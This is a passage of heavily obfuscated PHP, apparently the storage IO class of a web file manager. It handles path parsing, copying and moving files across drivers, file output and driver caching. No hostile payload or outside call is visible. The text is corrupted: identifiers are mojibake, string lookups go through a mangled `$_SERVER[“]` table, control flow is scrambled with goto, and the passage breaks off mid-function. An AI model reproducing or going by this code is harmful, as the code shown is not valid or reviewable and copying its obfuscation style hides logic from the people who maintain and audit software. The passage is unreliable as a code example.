infoFull($c°¾Ô¶¶¸Ê) { $c…˜¯½ß¹Ä =& $_SERVER[“]; $D®¶ÒŞŠÅ¾ = explode($c…˜¯½ß¹Ä[8], trim($c°¾Ô¶¶¸Ê, $c…˜¯½ß¹Ä[8])); if (count($D®¶ÒŞŠÅ¾) > 1) { $Bƒ…Óğ®Ë = implode($c…˜¯½ß¹Ä[8], array_splice($D®¶ÒŞŠÅ¾, 1)); $a÷†¸¡à„‹ = $this->model->pathInfoByPath($D®¶ÒŞŠÅ¾[0], $Bƒ…Óğ®Ë); if (!$a÷†¸¡à„‹) { return !1; } $this->pathParse[$c…˜¯½ß¹Ä[999]] = $a÷†¸¡à„‹[$c…˜¯½ß¹Ä[369]]; } return $this->infoParse($c°¾Ô¶¶¸Ê); } public function listAll($F¹„Š‘Î‘â) { goto D‚ğ­·Õ; cìÓ¯Êğ: $DµÏóÏ‚ŒÓ = $this->model->listAll($F¹„Š‘Î‘â); $b·ß”çŒÇ = Model($cÂèôÒ–Ç£[538])->getInfo($Bº„ÎÎòƒ´[$cÂèôÒ–Ç£[441]]); $d®‡ğÍ¹• = Action($cÂèôÒ–Ç£[1111]); goto D™î›ÌÓÚ; D™î›ÌÓÚ: foreach ($DµÏóÏ‚ŒÓ as &$cÆÅğÅ½ˆÜ) { check_abort(); $cÆÅğÅ½ˆÜ[$cÂèôÒ–Ç£[391]] = $d®‡ğÍ¹•->_shareItemeParse($cÆÅğÅ½ˆÜ[$cÂèôÒ–Ç£[391]], $b·ß”çŒÇ); } return $DµÏóÏ‚ŒÓ; goto FÊÏÅ³ªí; D‚ğ­·Õ: $cÂèôÒ–Ç£ =& $_SERVER[“]; $Bº„ÎÎòƒ´ = IO::info($this->pathParse[$cÂèôÒ–Ç£[75]]); if (!$Bº„ÎÎòƒ´) { return array(); } goto cìÓ¯Êğ; FÊÏÅ³ªí: } } goto d™‚õ©âÑ; BÅ¨Ğó…À: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($bÌ‚ÛƒŠİ‹, $E²Íî‰„Õ„) { $Bªè¥ŞŒÕò = self::driverMake($E²Íî‰„Õ„[0]); if (method_exists($Bªè¥ŞŒÕò, $bÌ‚ÛƒŠİ‹)) { return @call_user_func_array(array($Bªè¥ŞŒÕò, $bÌ‚ÛƒŠİ‹), $E²Íî‰„Õ„); } if (method_exists($Bªè¥ŞŒÕò, $_SERVER[“][984])) { return @call_user_func_array(array($Bªè¥ŞŒÕò, $bÌ‚ÛƒŠİ‹), $E²Íî‰„Õ„); } else { if (method_exists(self, $bÌ‚ÛƒŠİ‹)) { return @call_user_func_array(array(self, $bÌ‚ÛƒŠİ‹), $E²Íî‰„Õ„); } else { call_user_func_array(array(parent, $bÌ‚ÛƒŠİ‹), $E²Íî‰„Õ„); } } } public static function init($BêÜ¦ˆ®å) { return self::driverMake($BêÜ¦ˆ®å); } public static function copy($eÆÈ²»ò›Õ, $C„µ¥¸«ƒ, $b¾™±ÂÖ• = false, $F‘‚•«¨ã¿ = false) { return self::copyMove($eÆÈ²»ò›Õ, $C„µ¥¸«ƒ, $b¾™±ÂÖ•, $_SERVER[“][492], $F‘‚•«¨ã¿); } public static function move($D›‡Ê¼‚ê, $D‡±¼¥ÂŸ, $c„”ÀøÃ¿Ó = false, $bÈ¨’Ìˆ¹» = false) { return self::copyMove($D›‡Ê¼‚ê, $D‡±¼¥ÂŸ, $c„”ÀøÃ¿Ó, $_SERVER[“][494], $bÈ¨’Ìˆ¹»); } public static function saveFile($E—£é¥¤Ë, $c§£ù“ò†Ô, $eÔ‹…ÌÃÓ¼ = true) { goto CªÇ‹ŠÈµ; CªÇ‹ŠÈµ: $A±¦íÅé’Ì =& $_SERVER[“]; $bÁ¤ˆÉ†Àç = self::info($c§£ù“ò†Ô); $aÍ›ù¨¥ãİ = self::driverMake($E—£é¥¤Ë); goto dœÚ™öÓù¾; côË•ŒŠÓ¶: $dğôŸøàöŠ = self::copyFile($aÍ›ù¨¥ãİ, $E—£é¥¤Ë, $Eë÷ÒÙ¦¹œ, $DÇÍùà¸•†, $bÁ¤ˆÉ†Àç[$A±¦íÅé’Ì[28]], $Bñì½Ô¢‹Ø); if ($bôé…œ¨œ) { $dğôŸøàöŠ = $bôé…œ¨œ->getPathOuter($dğôŸøàöŠ); } return $dğôŸøàöŠ; goto c¾Ÿ±µÙò; dœÚ™öÓù¾: $Eë÷ÒÙ¦¹œ = self::driverMake($c§£ù“ò†Ô); $bôé…œ¨œ = !1; if ($Eë÷ÒÙ¦¹œ->pathParse[$A±¦íÅé’Ì[985]]) { $Dá¤”‡°õ = $Eë÷ÒÙ¦¹œ->pathParse[$A±¦íÅé’Ì[985]]; $bôé…œ¨œ = $Eë÷ÒÙ¦¹œ; $Eë÷ÒÙ¦¹œ = self::driverMake($Dá¤”‡°õ); } goto Bí„‡¹¶Ç…; Bí„‡¹¶Ç…: $DÇÍùà¸•† = $Eë÷ÒÙ¦¹œ->pathFather($c§£ù“ò†Ô); $Bñì½Ô¢‹Ø = !0; if (!$eÔ‹…ÌÃÓ¼ && self::driverIsSame($aÍ›ù¨¥ãİ, $Eë÷ÒÙ¦¹œ)) { $Bñì½Ô¢‹Ø = !1; } goto côË•ŒŠÓ¶; c¾Ÿ±µÙò: } private static function copyMove($b‘§à Áã—, $a¯ÏÏ›Ã›Ô, $cé²ØË…Ì…, $f›šº“ÑÎß, $fŠƒƒÌÎÅ = false) { goto D‘ÜÃËŒªÏ; dî±‰õ¿ÂÄ: if ($bç‘Ù¸Æ©¹) { $F¿¾´‹¬Ê½ = $bç‘Ù¸Æ©¹->getPathOuter($F¿¾´‹¬Ê½); } return $F¿¾´‹¬Ê½; goto a½ç ÁÒ‚ä; dÔ®’ãÖÈ: Hook::trigger($EĞå›ªÙºÏ[72], $bŒ¢µâòª, $b‘§à Áã—, $EÌ×Ù°ò„‘, $a¯ÏÏ›Ã›Ô); $dÕ­ÁŸ–¤Æ = self::driverIsSame($bŒ¢µâòª, $EÌ×Ù°ò„‘); if ($dÕ­ÁŸ–¤Æ) { if ($f›šº“ÑÎß == $EĞå›ªÙºÏ[494] && !method_exists($EÌ×Ù°ò„‘, $EĞå›ªÙºÏ[986]) && trim($a¯ÏÏ›Ã›Ô, $EĞå›ªÙºÏ[8]) == trim($EÌ×Ù°ò„‘->pathFather($b‘§à Áã—), $EĞå›ªÙºÏ[8])) { return $EÌ×Ù°ò„‘->getPathOuter($b‘§à Áã—); } if (method_exists($EÌ×Ù°ò„‘, $f›šº“ÑÎß)) { return $EÌ×Ù°ò„‘->{$f›šº“ÑÎß}($b‘§à Áã—, $a¯ÏÏ›Ã›Ô, $cé²ØË…Ì…); } } goto b’­‡±¸‹Æ; cçà¸Ø…‘¦: $bç‘Ù¸Æ©¹ = !1; if ($EÌ×Ù°ò„‘->pathParse[$EĞå›ªÙºÏ[985]]) { $a¯ÏÏ›Ã›Ô = $EÌ×Ù°ò„‘->pathParse[$EĞå›ªÙºÏ[985]]; $bç‘Ù¸Æ©¹ = $EÌ×Ù°ò„‘; $EÌ×Ù°ò„‘ = self::driverMake($a¯ÏÏ›Ã›Ô); } self::check($bŒ¢µâòª, $b‘§à Áã—, $EÌ×Ù°ò„‘, $a¯ÏÏ›Ã›Ô); goto dÔ®’ãÖÈ; D‘ÜÃËŒªÏ: $EĞå›ªÙºÏ =& $_SERVER[“]; if (!$b‘§à Áã— || $b‘§à Áã— == $EĞå›ªÙºÏ[8] || !$a¯ÏÏ›Ã›Ô) { return !1; } ignore_timeout(); goto báá·à‘; b’­‡±¸‹Æ: $FÑƒ·—Îé¤ = $bŒ¢µâòª->isFile($b‘§à Áã—); if (!$FÑƒ·—Îé¤ && $EÌ×Ù°ò„‘->getType() == $EĞå›ªÙºÏ[678] && $bŒ¢µâòª->getType() == $EĞå›ªÙºÏ[102]) { $F¿¾´‹¬Ê½ = $EÌ×Ù°ò„‘->copyFolderFromIO($bŒ¢µâòª, $b‘§à Áã—, $a¯ÏÏ›Ã›Ô, $cé²ØË…Ì…, $DŒğªíîÁ, $fŠƒƒÌÎÅ); } else { $F¿¾´‹¬Ê½ = self::copyPath($bŒ¢µâòª, $b‘§à Áã—, $EÌ×Ù°ò„‘, $a¯ÏÏ›Ã›Ô, $cé²ØË…Ì…, $DŒğªíîÁ, $FÑƒ·—Îé¤, $fŠƒƒÌÎÅ); } if ($F¿¾´‹¬Ê½ && $DŒğªíîÁ) { $bŒ¢µâòª->remove($b‘§à Áã—); } goto dî±‰õ¿ÂÄ; báá·à‘: $bŒ¢µâòª = self::driverMake($b‘§à Áã—); $EÌ×Ù°ò„‘ = self::driverMake($a¯ÏÏ›Ã›Ô); $DŒğªíîÁ = $f›šº“ÑÎß == $EĞå›ªÙºÏ[494]; goto cçà¸Ø…‘¦; a½ç ÁÒ‚ä: } private static function check($C˜á‚Ûß°í, $b¥ÜôŸäéŸ, $d‚ˆ†•öˆŞ, &$BÑ¦ÊÏÓ) { $DĞ—ƒ‹­Ÿ =& $_SERVER[“]; if (self::driverIsSame($C˜á‚Ûß°í, $d‚ˆ†•öˆŞ) && $C˜á‚Ûß°í->isFolder($b¥ÜôŸäéŸ) && $C˜á‚Ûß°í->isParentOf($b¥ÜôŸäéŸ, $BÑ¦ÊÏÓ)) { show_json(LNG($DĞ—ƒ‹­Ÿ[987]), !1); } if (!$C˜á‚Ûß°í->exist($b¥ÜôŸäéŸ)) { show_json(LNG($DĞ—ƒ‹­Ÿ[101]), !1); } } private static function copyPath($E¹À¯î§‰Â, $AÚÕ±äŒ„ø, $EÒ³ÚŒ½â, $f‘ñƒïÒâ‘, $c¡Î¿¤Ï¿Á, $Eã¶Ó–ºÙâ, $bŸÉêæğÙÕ, $DäÂ¹ˆ³–Ù = false) { goto E÷É°ÏÂÃì; Cğ¶ËË¼Å: $dŒùÉ…©ä¿ = array_merge($B¹½ÃÓì[$C¤Ó¢±Ï[73]], $B¹½ÃÓì[$C¤Ó¢±Ï[74]]); foreach ($dŒùÉ…©ä¿ as $cˆøí½°¶) { $eø´äÂ½©£ = $cˆøí½°¶[$C¤Ó¢±Ï[29]] == $C¤Ó¢±Ï[167]; $AÚÕ±äŒ„ø = $E¹À¯î§‰Â->getPathInner($cˆøí½°¶[$C¤Ó¢±Ï[75]]); $f¥ì‹¾ê†Ö = self::copyPath($E¹À¯î§‰Â, $AÚÕ±äŒ„ø, $EÒ³ÚŒ½â, $f‘ñƒïÒâ‘, $c¡Î¿¤Ï¿Á, $Eã¶Ó–ºÙâ, $eø´äÂ½©£); if (!$f¥ì‹¾ê†Ö) { write_log($C¤Ó¢±Ï[988] . $AÚÕ±äŒ„ø . $C¤Ó¢±Ï[989] . $f‘ñƒïÒâ‘, $C¤Ó¢±Ï[990]); } } return $d—Ü…Œâ‰; goto aÔ«ˆğ¿ã›; cÛ²°§—Éà: if ($bŸÉêæğÙÕ) { return self::copyFile($E¹À¯î§‰Â, $AÚÕ±äŒ„ø, $EÒ³ÚŒ½â, $f‘ñƒïÒâ‘, $F…ˆà§®—², $Eã¶Ó–ºÙâ); } if ($c¡Î¿¤Ï¿Á == REPEAT_RENAME_FOLDER) { $c¡Î¿¤Ï¿Á = !1; } $d§†óõÓ²ò = rtrim($f‘ñƒïÒâ‘, $C¤Ó¢±Ï[8]) . $C¤Ó¢±Ï[8] . $F…ˆà§®—²; goto dİï¾ã‚Ò; dİï¾ã‚Ò: $d—Ü…Œâ‰ = $EÒ³ÚŒ½â->mkdir($EÒ³ÚŒ½â->getPath($d§†óõÓ²ò)); $f‘ñƒïÒâ‘ = $EÒ³ÚŒ½â->getPathInner($d—Ü…Œâ‰); $B¹½ÃÓì = $E¹À¯î§‰Â->listPath($AÚÕ±äŒ„ø, !0); goto Cğ¶ËË¼Å; E÷É°ÏÂÃì: $C¤Ó¢±Ï =& $_SERVER[“]; $F…ˆà§®—² = $DäÂ¹ˆ³–Ù ? $DäÂ¹ˆ³–Ù : $E¹À¯î§‰Â->getPathName($E¹À¯î§‰Â->pathThis($AÚÕ±äŒ„ø)); if ($c¡Î¿¤Ï¿Á) { $f½¡„»´• = $EÒ³ÚŒ½â->fileNameExist($f‘ñƒïÒâ‘, $F…ˆà§®—²); $F…ˆà§®—² = $EÒ³ÚŒ½â->fileNameAuto($f‘ñƒïÒâ‘, $F…ˆà§®—², $c¡Î¿¤Ï¿Á, !$bŸÉêæğÙÕ); $c¡Î¿¤Ï¿Á = $f½¡„»´• ? $c¡Î¿¤Ï¿Á : !1; } goto cÛ²°§—Éà; aÔ«ˆğ¿ã›: } private static function copyFile($aÈˆÒ¹±çƒ, $cŒÍ”’Š¼‹, $FŠÛËë…, $A“Ìä«÷²÷, $f…µá°§ÃÎ, $bÏºÜæóòœ) { goto cƒÂ©ß¤çÃ; bÁÊ¤¼µ†: mk_dir($E‰‹Éçñ´–); $cí£÷òÚ²è = $E‰‹Éçñ´– . $f©éœ˜“Äê; $cí£÷òÚ²è = $aÈˆÒ¹±çƒ->download($cŒÍ”’Š¼‹, $cí£÷òÚ²è); goto CÌåéÖò¸; CÌåéÖò¸: $cí£÷òÚ²è = $aÈˆÒ¹±çƒ->iconvApp($cí£÷òÚ²è); $f…¾®çØæ² = $FŠÛËë…->upload($A“Ìä«÷²÷, $cí£÷òÚ²è, $bÏºÜæóòœ); self::remove($E‰‹Éçñ´– . $f©éœ˜“Äê); goto B¦»Í£›ñ“; B¦»Í£›ñ“: Hook::trigger($aøëœ²ƒÒ[993], $aÈˆÒ¹±çƒ, $cŒÍ”’Š¼‹, $FŠÛËë…, $A“Ìä«÷²÷, $f…µá°§ÃÎ, $f…¾®çØæ²); return $f…¾®çØæ²; goto CÓˆ–ê‘; f­ß¨‰¸è¯: Hook::trigger($aøëœ²ƒÒ[992], $aÈˆÒ¹±çƒ, $cŒÍ”’Š¼‹, $FŠÛËë…, $A“Ìä«÷²÷, $f…µá°§ÃÎ, $f©éœ˜“Äê); if (self::driverIsSame($aÈˆÒ¹±çƒ, $FŠÛËë…)) { if ($bÏºÜæóòœ) { $f…¾®çØæ² = $FŠÛËë…->moveFile($cŒÍ”’Š¼‹, $A“Ìä«÷²÷); } else { $f…¾®çØæ² = $FŠÛËë…->copyFile($cŒÍ”’Š¼‹, $A“Ìä«÷²÷); } Hook::trigger($aøëœ²ƒÒ[993], $aÈˆÒ¹±çƒ, $cŒÍ”’Š¼‹, $FŠÛËë…, $A“Ìä«÷²÷, $f…µá°§ÃÎ, $f…¾®çØæ²); return $f…¾®çØæ²; } $E‰‹Éçñ´– = TEMP_FILES; goto bÁÊ¤¼µ†; cƒÂ©ß¤çÃ: $aøëœ²ƒÒ =& $_SERVER[“]; $A“Ìä«÷²÷ = $FŠÛËë…->getPath(rtrim($A“Ìä«÷²÷, $aøëœ²ƒÒ[8]) . $aøëœ²ƒÒ[8] . $f…µá°§ÃÎ); $f©éœ˜“Äê = $aøëœ²ƒÒ[991] . time() . rand_string(5); goto f­ß¨‰¸è¯; CÓˆ–ê‘: } public static function pathFather($BÇ‡ñ†Ûàó) { $dø¤¥Ù„å = IO::init($BÇ‡ñ†Ûàó); $a·™Š§ÒºÊ = $dø¤¥Ù„å->pathFather($dø¤¥Ù„å->path); return $dø¤¥Ù„å->getPathOuter($a·™Š§ÒºÊ); } public static function fileOut($cŠˆŒª•ö, $díâ¨”ã» = false, $eÛŠÄ¯Ç°˜ = false, $BêÄìÚÇ‡‚ = '') { $e…œœÊŠ…Ø = self::driverMake($cŠˆŒª•ö); if ($e…œœÊŠ…Ø->isFileOutServer()) { return $e…œœÊŠ…Ø->fileOutServer($cŠˆŒª•ö, $díâ¨”ã», $eÛŠÄ¯Ç°˜, $BêÄìÚÇ‡‚); } return $e…œœÊŠ…Ø->fileOut($cŠˆŒª•ö, $díâ¨”ã», $eÛŠÄ¯Ç°˜, $BêÄìÚÇ‡‚); } public static function fileOutImage($eùë¯²˜­İ, $AŸæ´òÓì‡ = 250) { $B’‰Ê±¤­Ç = array(250, 600, 1200, 3000); for ($A¨’×»¯è = 0; $A¨’×»¯è < count($B’‰Ê±¤­Ç); $A¨’×»¯è++) { if ($A¨’×»¯è == 0 && $AŸæ´òÓì‡ <= $B’‰Ê±¤­Ç[$A¨’×»¯è]) { $AŸæ´òÓì‡ = $B’‰Ê±¤­Ç[$A¨’×»¯è]; break; } else { if ($AŸæ´òÓì‡ > $B’‰Ê±¤­Ç[$A¨’×»¯è - 1] && $AŸæ´òÓì‡ <= $B’‰Ê±¤­Ç[$A¨’×»¯è]) { $AŸæ´òÓì‡ = $B’‰Ê±¤­Ç[$A¨’×»¯è]; break; } else { if ($A¨’×»¯è == count($B’‰Ê±¤­Ç) - 1 && $AŸæ´òÓì‡ > $B’‰Ê±¤­Ç[$A¨’×»¯è]) { $AŸæ´òÓì‡ = $B’‰Ê±¤­Ç[$A¨’×»¯è]; break; } } } } $eõêœ¬‡ÔÓ = self::driverMake($eùë¯²˜­İ); if ($eõêœ¬‡ÔÓ->isFileOutServer()) { return $eõêœ¬‡ÔÓ->fileOutImageServer($eùë¯²˜­İ, $AŸæ´òÓì‡); } return $eõêœ¬‡ÔÓ->fileOutImage($eùë¯²˜­İ, $AŸæ´òÓì‡); } private static function driverIsSame($CÙÒ­‹‹‘Î, $eÆ¨¡×÷¡é) { goto EÜõ¹óÉï„; fìò¿»Åñ¾: if ($Fíğäù–Ëï != $F‰‡¥—ïñ¼) { return !1; } if ($Fíğäù–Ëï == $bÙåƒ§Úï™[678]) { return !0; } if ($Fíğäù–Ëï == $bÙåƒ§Úï™[102]) { return !0; } goto B«„ëïÔ¦; B«„ëïÔ¦: if ($CÙÒ­‹‹‘Î->pathDriver == $eÆ¨¡×÷¡é->pathDriver) { return !0; } return !1; goto bˆÄ¡ˆ²®; EÜõ¹óÉï„: $bÙåƒ§Úï™ =& $_SERVER[“]; $Fíğäù–Ëï = $CÙÒ­‹‹‘Î->getType(); $F‰‡¥—ïñ¼ = $eÆ¨¡×÷¡é->getType(); goto fìò¿»Åñ¾; bˆÄ¡ˆ²®: } public static function copyUpdate($F…¨ø©’¼Ñ, $d±ø¿ØôÌ‚) { goto A¶İ¡¿ÛÁ; Aº¯Á‘Şâ: Hook::trigger($f”Äåñâ†Ø[997], $F…¨ø©’¼Ñ, $d±ø¿ØôÌ‚, $Eßå¶Ü¦¥º); foreach ($b–‚±æÏ­ as $E–¨ì¹èºó) { IO::mkdir($E–¨ì¹èºó); } foreach ($fİè×Ê«ğ› as $E–¨ì¹èºó) { IO::copy($E–¨ì¹èºó[$f”Äåñâ†Ø[994]], $E–¨ì¹èºó[$f”Äåñâ†Ø[995]], REPEAT_REPLACE); } goto EæÆ¾º‡æ«; dí¹™÷´Çœ: $eó×…ñóÙø = self::_listAll($F…¨ø©’¼Ñ); $B¤Œ‚«š§Œ = self::_listAll($d±ø¿ØôÌ‚); $fİè×Ê«ğ› = array(); goto CˆÛŸÈ‰†¬; CˆÛŸÈ‰†¬: $b–‚±æÏ­ = array(); foreach ($eó×…ñóÙø as $A¢ÑÌË¤ĞÕ => $E–¨ì¹èºó) { if (isset($B¤Œ‚«š§Œ[$A¢ÑÌË¤ĞÕ])) { if ($E–¨ì¹èºó[$f”Äåñâ†Ø[76]] == 1) { continue; } if ($B¤Œ‚«š§Œ[$A¢ÑÌË¤ĞÕ][$f”Äåñâ†Ø[77]] == $E–¨ì¹èºó[$f”Äåñâ†Ø[77]]) { continue; } } if ($E–¨ì¹èºó[$f”Äåñâ†Ø[76]] == 1) { $b–‚±æÏ­[] = $d±ø¿ØôÌ‚ . $f”Äåñâ†Ø[8] . $A¢ÑÌË¤ĞÕ; continue; } $B¶ªÂ¶ŸÖÁ = strstr(trim($A¢ÑÌË¤ĞÕ, $f”Äåñâ†Ø[8]), $f”Äåñâ†Ø[8]) ? get_path_father($A¢ÑÌË¤ĞÕ) : $f”Äåñâ†Ø[33]; $fİè×Ê«ğ›[] = array($f”Äåñâ†Ø[994] => $E–¨ì¹èºó[$f”Äåñâ†Ø[75]], $f”Äåñâ†Ø[995] => rtrim($d±ø¿ØôÌ‚, $f”Äåñâ†Ø[8]) . $f”Äåñâ†Ø[8] . $B¶ªÂ¶ŸÖÁ, $f”Äåñâ†Ø[996] => $E–¨ì¹èºó); } $Eßå¶Ü¦¥º = array($f”Äåñâ†Ø[167] => $fİè×Ê«ğ›, $f”Äåñâ†Ø[76] => $b–‚±æÏ­); goto Aº¯Á‘Şâ; A¶İ¡¿ÛÁ: $f”Äåñâ†Ø =& $_SERVER[“]; if (!IO::exist($F…¨ø©’¼Ñ)) { return !1; } if (!IO::exist($d±ø¿ØôÌ‚)) { IO::mkdir($d±ø¿ØôÌ‚); } goto dí¹™÷´Çœ; EæÆ¾º‡æ«: } private static function _listAll($e£À¢‘¬ĞÎ) { $fŞ•‘»«ê =& $_SERVER[“]; $e£À¢‘¬ĞÎ = KodIO::clear($e£À¢‘¬ĞÎ); $CÜİæªÆ¼ = IO::listAll($e£À¢‘¬ĞÎ); foreach ($CÜİæªÆ¼ as &$FğïÚ§Åèõ) { $CŒà–õÌâï = substr($FğïÚ§Åèõ[$fŞ•‘»«ê[75]], strlen($e£À¢‘¬ĞÎ)); $FğïÚ§Åèõ[$fŞ•‘»«ê[998]] = trim($CŒà–õÌâï, $fŞ•‘»«ê[8]); } return array_to_keyvalue($CÜİæªÆ¼, $fŞ•‘»«ê[998]); } public static function fileSubstr($EŞ®À¯‘ôÕ, $Aˆˆ öÊ¸Š, $e†¹Š½ = false) { goto f¨ÃÈÖˆ»¤; BœßÂ‹Œß: if ($Aˆˆ öÊ¸Š + $e†¹Š½ > $cºÖĞ³ã¢ò) { $e†¹Š½ = $cºÖĞ³ã¢ò - $Aˆˆ öÊ¸Š; } if ($e†¹Š½ <= 0) { return $_SERVER[“][33]; } if ($Aˆˆ öÊ¸Š < 0 || $Aˆˆ öÊ¸Š >= $cºÖĞ³ã¢ò || $e†¹Š½ > 1024 * 1024 * 5) { throw new Exception("\146\x69\154\145\122\x65\x61\144\x20\145\x72\162\x6f\x72\41\40\x73\164\x61\162\x74\75{$Aˆˆ öÊ¸Š}\x3b\x6c\x65\156\147\x74\150\75{$e†¹Š½}\x3b\x20\x73\x69\172\x65\x3d{$cºÖĞ³ã¢ò}\73"); } goto fê‚â„Èª„; fê‚â„Èª„: return $fÈÉ³Ë™½¾->fileSubstr($EŞ®À¯‘ôÕ, $Aˆˆ öÊ¸Š, $e†¹Š½); goto cå—Œã ÇØ; Cëôµ‘ÆÆø: $dšçËîÎéÈ = $e†¹Š½; if ($Aˆˆ öÊ¸Š < 0) { $Aˆˆ öÊ¸Š = $cºÖĞ³ã¢ò + $Aˆˆ öÊ¸Š; } if ($e†¹Š½ === !1) { $e†¹Š½ = $cºÖĞ³ã¢ò - $Aˆˆ öÊ¸Š; } goto BœßÂ‹Œß; f¨ÃÈÖˆ»¤: $fÈÉ³Ë™½¾ = self::driverMake($EŞ®À¯‘ôÕ); $cºÖĞ³ã¢ò = $fÈÉ³Ë™½¾->size($EŞ®À¯‘ôÕ); $cÁšêØÁ = $Aˆˆ öÊ¸Š; goto Cëôµ‘ÆÆø; cå—Œã ÇØ: } private static function driverMake(&$AŒ‘½‰Ş”) { goto dË¢ŸÔâ¿‹; A±á«ÙÔÊ˜: return $F·œß²ÁŠ; goto aºÂñˆŒ¸½; dË¢ŸÔâ¿‹: $BöµËÄù©© =& $_SERVER[“]; $aâÊîèŸï = KodIO::parse($AŒ‘½‰Ş”); if (!self::$driverListSystem) { $D¾†…ç‘Šƒ = Model($BöµËÄù©©[687])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($D¾†…ç‘Šƒ, $BöµËÄù©©[367]); } goto fÏËÌ”›Û‚; fÏËÌ”›Û‚: if ($aâÊîèŸï[$BöµËÄù©©[29]] == KodIO::KOD_IO && !self::$driverListSystem[$aâÊîèŸï[$BöµËÄù©©[367]]]) { return !1; } $AŒ‘½‰Ş” = $aâÊîèŸï[$BöµËÄù©©[999]]; $F·œß²ÁŠ = self::driverGet($aâÊîèŸï, $AŒ‘½‰Ş”); goto A±á«ÙÔÊ˜; aºÂñˆŒ¸½: } private static function driverGet($eİÇ¤”šÅ£, &$cèìæ†¬Ïš) { goto E†™Üê™—Á; EŒ‹‚äƒ•: $aÎÓèàöéœ->path = $cèìæ†¬Ïš; return $aÎÓèàöéœ; goto díİ»ğ¯¨Ø; A‘— ÅîÆ: $aÎÓèàöéœ = self::$driverCache[$Bˆ™§åÇ†Á]; $aÎÓèàöéœ->pathDriver = $A«î‘²Áè; $aÎÓèàöéœ->pathBase = $fÌìšŸÙĞ¢[33]; goto bğÔŠ”à‰‰; E†™Üê™—Á: $fÌìšŸÙĞ¢ =& $_SERVER[“]; $A«î‘²Áè = $eİÇ¤”šÅ£[$fÌìšŸÙĞ¢[1000]]; $F˜è†õ…óÚ = $eİÇ¤”šÅ£[$fÌìšŸÙĞ¢[367]]; goto dÅÚÆ®†·ñ; dÅÚÆ®†·ñ: switch ($eİÇ¤”šÅ£[$fÌìšŸÙĞ¢[29]]) { case KodIO::KOD_IO: $E­êÆ‹É¡¡ = self::$driverListSystem[$F˜è†õ…óÚ]; break; case KodIO::KOD_SOURCE: $cèìæ†¬Ïš = $F˜è†õ…óÚ . $cèìæ†¬Ïš; $E­êÆ‹É¡¡ = array($fÌìšŸÙĞ¢[1001] => $fÌìšŸÙĞ¢[1002], $fÌìšŸÙĞ¢[6] => $eİÇ¤”šÅ£); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $aœµ¬ò¾½‚ = $GLOBALS[$fÌìšŸÙĞ¢[1003]]; self::$driverListUser = array_to_keyvalue($aœµ¬ò¾½‚, $fÌìšŸÙĞ¢[367]); } $E­êÆ‹É¡¡ = self::$driverListUser[$F˜è†õ…óÚ]; break; case KodIO::KOD_SHARE_LINK: $E­êÆ‹É¡¡ = array($fÌìšŸÙĞ¢[1001] => $fÌìšŸÙĞ¢[1004], $fÌìšŸÙĞ¢[6] => $eİÇ¤”šÅ£); $d•„ÙĞë´£ = Action($fÌìšŸÙĞ¢[1005])->sharePathInfo($eİÇ¤”šÅ£[$fÌìšŸÙĞ¢[75]]); $cèìæ†¬Ïš = $d•„ÙĞë´£[$fÌìšŸÙĞ¢[369]]; if (!$d•„ÙĞë´£[$fÌìšŸÙĞ¢[369]]) { $DÑ„ì·¹’ = Model($fÌìšŸÙĞ¢[538])->getInfo($d•„ÙĞë´£[$fÌìšŸÙĞ¢[441]]); $cèìæ†¬Ïš = KodIO::clear($DÑ„ì·¹’[$fÌìšŸÙĞ¢[1006]] . $eİÇ¤”šÅ£[$fÌìšŸÙĞ¢[999]]); $eİÇ¤”šÅ£[$fÌìšŸÙĞ¢[439]] = $DÑ„ì·¹’; $eİÇ¤”šÅ£[$fÌìšŸÙĞ¢[985]] = $cèìæ†¬Ïš; $E­êÆ‹É¡¡ = array($fÌìšŸÙĞ¢[1001] => $fÌìšŸÙĞ¢[1007], $fÌìšŸÙĞ¢[6] => $eİÇ¤”šÅ£); } break; case KodIO::KOD_SHARE_ITEM: $E­êÆ‹É¡¡ = array($fÌìšŸÙĞ¢[1001] => $fÌìšŸÙĞ¢[1008], $fÌìšŸÙĞ¢[6] => $eİÇ¤”šÅ£); $DÑ„ì·¹’ = Model($fÌìšŸÙĞ¢[538])->getInfo($eİÇ¤”šÅ£[$fÌìšŸÙĞ¢[367]]); if ($DÑ„ì·¹’[$fÌìšŸÙĞ¢[369]] == $fÌìšŸÙĞ¢[470]) { $cèìæ†¬Ïš = KodIO::clear($DÑ„ì·¹’[$fÌìšŸÙĞ¢[1006]] . $eİÇ¤”šÅ£[$fÌìšŸÙĞ¢[999]]); $eİÇ¤”šÅ£[$fÌìšŸÙĞ¢[439]] = $DÑ„ì·¹’; $eİÇ¤”šÅ£[$fÌìšŸÙĞ¢[985]] = $cèìæ†¬Ïš; $E­êÆ‹É¡¡ = array($fÌìšŸÙĞ¢[1001] => $fÌìšŸÙĞ¢[1009], $fÌìšŸÙĞ¢[6] => $eİÇ¤”šÅ£); } else { if (!$cèìæ†¬Ïš) { $cèìæ†¬Ïš = $DÑ„ì·¹’[$fÌìšŸÙĞ¢[369]]; } } break; default: $cèìæ†¬Ïš = $eİÇ¤”šÅ£[$fÌìšŸÙĞ¢[75]]; $E­êÆ‹É¡¡ = array($fÌìšŸÙĞ¢[1001] => $fÌìšŸÙĞ¢[1010]); break; } $Bˆ™§åÇ†Á = $eİÇ¤”šÅ£[$fÌìšŸÙĞ¢[75]]; if (!isset(self::$driverCache[$Bˆ™§åÇ†Á])) { $bîÛº•’• = strtolower($E­êÆ‹É¡¡[$fÌìšŸÙĞ¢[90]]); $cÜÓ™¡‹‚ = $GLOBALS[$fÌìšŸÙĞ¢[6]][$fÌìšŸÙĞ¢[84]][$fÌìšŸÙĞ¢[737]]; $AÏ„Ô•½¿ = $fÌìšŸÙĞ¢[71] . (isset($cÜÓ™¡‹‚[$bîÛº•’•]) ? $cÜÓ™¡‹‚[$bîÛº•’•] : ucfirst($bîÛº•’•)); if (!class_exists($AÏ„Ô•½¿)) { show_json("{$AÏ„Ô•½¿}\x20\156\x6f\164\40\145\x78\x69\x73\x74\163\41", !1); } $cìÑÊæ“õñ = isset($E­êÆ‹É¡¡[$fÌìšŸÙĞ¢[6]]) ? $E­êÆ‹É¡¡[$fÌìšŸÙĞ¢[6]] : !1; self::$driverCache[$Bˆ™§åÇ†Á] = new $AÏ„Ô•½¿($cìÑÊæ“õñ); } goto A‘— ÅîÆ; bğÔŠ”à‰‰: if 